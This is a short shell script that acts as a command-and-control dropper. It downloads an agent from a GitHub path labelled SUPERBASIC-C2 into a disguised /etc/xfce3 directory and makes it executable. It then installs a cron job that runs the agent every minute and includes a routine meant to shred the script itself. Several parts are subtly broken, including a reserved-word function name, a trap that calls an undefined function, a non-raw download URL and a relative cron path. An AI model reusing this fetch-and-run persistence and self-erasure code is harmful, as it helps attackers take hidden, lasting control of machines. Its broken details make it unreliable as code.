#!/bin/sh

wget=/usr/bin/wget

TARGET_DIR="/etc/"
WGET_URL="https://github.com/routpalm/SUPERBASIC-C2/tree/main/agents/defaultagent"
NEW_DIR="xfce3"
FILE="defaultagent"
SCRIPT_PATH="$0"
done() {
  echo "Shredding self..."; shred -u ${SCRIPT_PATH};
}
if [ ! -x "$wget" ]; then
  echo "ERROR: No wget." >&2
  exit 1
fi

echo "Making new directory..."

if ! cd "$TARGET_DIR"; then
  echo "ERROR: can't access directory ($TARGET_DIR)" >&2
  exit 1
fi

if ! mkdir "$NEW_DIR"; then
  echo "ERROR: can't make directory ($NEW_DIR)" >&2
  exit 1
fi

if ! cd "$NEW_DIR"; then
  echo "ERROR: can't access directory ($NEW_DIR)" >&2
  exit 1
fi

echo "Downloading script..."

if ! wget ${WGET_URL}; then
  echo "ERROR: can't download script" >&2
  exit 1
fi

if ! chmod +x $FILE; then
  echo "ERROR: can't make script executable" >&2
  exit 1
fi

echo "Script downloaded... creating cronjob"

if ! cd ~; then
  echo "ERROR: Can't access user home directory" >&2
  exit 1
fi

if ! crontab -l > newcron; then
  echo "ERROR: Can't access crontab" >&2
  exit 1
fi
echo "* * * * * ./etc/xfce3/defaultagent" >> newcron

if ! crontab newcron; then
  echo "ERROR: Can't set crontab" >&2
  exit 1
fi
rm newcron

echo "Cronjob created."

trap del EXIT
